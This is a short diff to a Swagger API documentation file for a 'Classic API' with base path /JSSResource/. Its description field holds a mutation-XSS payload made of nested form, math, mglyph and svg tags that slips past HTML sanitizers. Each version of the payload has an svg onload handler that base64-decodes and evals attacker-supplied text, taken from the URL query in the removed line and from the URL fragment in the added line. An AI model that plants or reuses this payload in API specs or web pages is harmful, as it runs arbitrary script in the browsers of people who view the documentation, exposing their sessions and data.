@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg onload='a=window.location.href.split('&'); eval(atob(a[a.length-1]))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg onload='eval(atob(document.location.hash.slice(1)))'>"></form>
 
   version: production
 basePath: /JSSResource/
